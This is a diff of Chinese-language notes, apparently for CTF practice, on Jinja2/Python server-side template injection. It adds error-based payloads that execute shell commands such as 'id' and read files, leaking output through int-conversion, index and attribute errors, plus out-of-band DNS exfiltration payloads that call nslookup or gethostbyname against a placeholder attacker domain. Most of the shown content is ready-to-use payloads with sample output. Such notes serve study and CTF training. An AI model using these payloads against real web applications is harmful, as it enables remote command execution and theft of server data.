@@ -24,13 +24,48 @@ linux ping -n 4 127.0.0.1
     return "用户名不存在"             # ④ 没有 → 回这个
     
     {%if 条件%}admin{% endif %}	判断语句
-## 3.报错注入
 
-通过报错日志把数据带出来显示
+##3.报错注入
+
+通过报错日志把数据带出来显示(根据引擎决定能不能带上)
 3.1类型转换错误
-
 ```
 {{__import__('os').popen('id').read()|int}}
+{{lipsum.__globals__.__builtins__.int(数据源)}}
+ValueError: invalid literal for int() with base 10: '数据'
 通过将数据源转换类型报错带出数据
+{{数据源 + 123}}
+>>> "数据源 + 123"
+TypeError: can only concatenate str (not "int") to str
+
+
+```
+3.2访问不存在属性和索引
+
+```
+{{ [__import__('os').popen('id').read()][999] }}
+将数据源用[]框起来去读取索引
+IndexError: list index out of range
+'uid=0(root) gid=0(root) ...' ][999]
+
+{{ __import__('os').popen('id').read().xxx }}
+读取不存在的属性
+AttributeError: 'dict' object has no attribute 'fakeattr'
+Template context:
+{{ dict(res='uid=0(root) gid=0(root) ...').fakeattr }}
+
+{{ lipsum.__globals__.__builtins__.open(数据源).read()}}
+读取数据源
+FileNotFoundError: [Errno 2] No such file or directory: 'flag{xxx}'
+```
+
+##4.外带注入
+4.1dns外带
+
+```
+jinja自带
+{{ lipsum.__globals__.__builtins__.__import__('os').popen('nslookup 数据.你的域名').read() }}
+python原生
+{{ lipsum.__globals__.__builtins__.__import__('socket').gethostbyname('数据.你的域名') }}
 ```
 
